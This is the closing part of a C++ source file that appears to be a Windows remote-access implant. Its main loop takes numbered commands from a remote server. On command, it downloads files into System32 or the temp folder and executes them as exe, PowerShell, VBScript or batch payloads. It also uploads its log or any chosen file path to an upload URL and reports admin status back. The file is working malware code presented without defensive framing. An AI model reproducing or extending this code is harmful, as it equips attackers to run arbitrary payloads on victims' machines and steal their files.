                                logMessage("Admin status: " + admin_status);
                                SESSION_TRACKER = "Admin Status :" + admin_status;
                                send_operation_status();
                                continue;
                            }

                            if (command == "10") {
                                upload_file(UPLOAD_FILE_URL, LOG_FILE_PATH);
                                send_operation_status();
                                continue;
                            }

                            if (command == "11") {
                                upload_file(UPLOAD_FILE_URL, path);
                                 send_operation_status();
                                continue;
                            }

                            if (command == "100") {
                                send_operation_status();
                                std::this_thread::sleep_for(std::chrono::seconds(std::stoi(go_to_sleep)));
                                continue;
                            }

                            std::string file_path = (command == "5" || command == "6") ? SYSTEM32_DIR +  filename : get_temp_folder() +  filename;

                            download_file(DOWN_LOAD_URL, file_path);
                            logMessage("Downloaded file: " + file_path);

                            if (!time_to_execute.empty()) {
                                std::this_thread::sleep_for(std::chrono::seconds(std::stoi(time_to_execute)));
                            }

                            std::unordered_map<std::string, std::string> file_types = {
                                {"1", "exe"}, {"2", "ps1"}, {"3", "vbs"},
                                {"4", "bat"}, {"20", "json"}
                            };

                            std::string file_type = file_types.count(command) ? file_types[command] : "unknown";
                            execute_file(file_path, file_type);

                            if (command == "5" || command == "6") {
                                logMessage("Script terminating after executing file: " + file_path);
                                break;
                            }

                            logMessage("Command " + command + " executed successfully.");
                        }
                        else {
                            logMessage("Failed to fetch data. Status code: " + std::to_string(response.status_code));
                        }
                    }
                    send_operation_status();
                    SESSION_TRACKER = "";
                }
                catch (const std::exception& e) {
                    logMessage("Exception in main loop: " + std::string(e.what()));
                    SESSION_TRACKER += "->While Loop Exception";
                    send_operation_status();
                }
                
            }
        }
        catch (const std::exception& e) {
            logMessage("Unexpected exception in main: " + std::string(e.what()));
            SESSION_TRACKER += "->Main Loop exception";
        }
    }



    int main()
    {
        //logMessage("Script started.");
        /*if (!isAdmin()) {
            logMessage("Not running as admin.");
        }*/
        
        mainLoop();

        return 0;
    }

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

